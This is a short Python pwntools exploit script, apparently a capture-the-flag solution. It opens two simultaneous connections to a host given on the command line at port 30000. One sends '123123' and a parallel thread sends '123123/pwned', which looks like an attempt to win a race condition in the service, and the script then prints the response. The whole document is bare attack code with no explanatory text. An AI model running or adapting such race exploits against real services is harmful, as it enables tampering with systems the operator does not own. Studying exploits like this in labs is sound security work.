from pwn import *
import threading
import argparse

class Writer(threading.Thread):
    """Thread class with a stop() method. The thread itself has to check
    regularly for the stopped() condition."""

    def __init__(self, *args, **kwargs):
        super(Writer, self).__init__(*args, **kwargs)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()
    
    def run(self):
        r = remote(self._Thread__args[0], 30000)
        r.sendline('123123/pwned')

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='host', type=str)

    args = parser.parse_args()

    thread = Writer(args=(args.host,))

    r = remote(args.host, 30000)
    r.sendline('123123')
    thread.start()
    print(r.recvall())

    thread.stop()
    thread.join()

if __name__ == "__main__":
    main()
